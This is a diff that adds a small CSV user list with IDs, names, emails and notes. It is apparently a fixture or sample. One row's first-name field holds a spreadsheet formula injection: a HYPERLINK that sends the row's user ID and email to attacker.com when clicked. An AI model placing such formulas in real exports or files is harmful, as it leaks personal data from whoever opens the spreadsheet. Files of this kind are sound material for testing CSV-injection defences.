@@ -1,0 +1,5 @@
+UserID,FirstName,LastName,Email,Notes
+101,Alice,Smith,alice@example.com,Regular User
+102,Bob,Johnson,bob@example.com,Admin
+103,"=HYPERLINK(""http://attacker.com/log?uid=""&A103&""&email=""&D103,""Click for Profile"")",Malone,mallory@malicious.org,Needs Review
+104,Charlie,Davis,charlie@example.com,Active
